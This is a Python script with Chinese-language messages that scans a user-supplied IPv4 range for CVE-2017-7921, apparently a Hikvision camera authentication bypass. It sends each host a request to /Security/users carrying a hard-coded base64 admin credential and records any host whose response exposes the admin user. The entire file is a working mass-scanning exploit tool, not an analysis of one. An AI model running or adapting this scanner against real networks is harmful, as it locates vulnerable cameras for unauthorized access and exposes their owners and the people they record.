#!/usr/bin/env python
# -*- coding:utf-8 -*-

import requests
import time
import sys
import re
import ipaddress
from requests.packages import urllib3

urllib3.disable_warnings()

#使用Python3进行
#命令:python3 hk-CVE-2017-7921.py x.x.x.x-y.y.y.y

def req(url, i):
    # time.sleep(1) #有waf请加上这句
    try:
        payload = "http://" + url + "/Security/users?auth=YWRtaW46MTEK"
        res = requests.get(url=payload, verify=False, timeout=0.5) #调节timeout可以增加速度
        if "<userName>admin</userName>" in res.text:
            print("第" + str(i) + "个IP:" + url + ":疑似存在CVE-2017-7921漏洞，请进一步检测")
            return True
        else:
            print("第" + str(i) + "个IP:" + url + ":不存在漏洞")
            return False
    except:
        print("第" + str(i) + "个IP:" + url + ":无法连接"+res.status_code)
        return False


if __name__ == '__main__':
    f = open("payload.txt", "w+")
    count = 1

    try:
        ipaddrs = sys.argv[1]
    except:
        print("请加上IP段")
        exit(0)

    if "-" in ipaddrs:
        ipaddr = ipaddrs.split("-")
    else:
        print("请输入正确的IP网段")
        exit(0)
    if re.findall(r'(.*\d)\.(.*\d)\.(.*\d)\.(.*\d)', ipaddr[0]) and re.findall(r'(.*\d)\.(.*\d)\.(.*\d)\.(.*\d)',
                                                                               ipaddr[1]):
        start_ip = ipaddress.IPv4Address(ipaddr[0])
        end_ip = ipaddress.IPv4Address(ipaddr[1])
        for ip_int in range(int(start_ip), int(end_ip)):
            url = str(ipaddress.IPv4Address(ip_int))
            Bool = req(url, count)
            if Bool == True:
                f.write(url + "\n")
            count += 1
    else:
        print("请查看IP地址是否正确")
        exit(0)

    f.close()

    urls = open("payload.txt", "r").read()
    urllist = urls.split("\n")
    print('\n' + "疑似" + str(len(urllist)-1) + "台设备存在CVE-2017-7921漏洞，IP为：")
    for j in urllist:
        print(j)
    print("请进一步检测")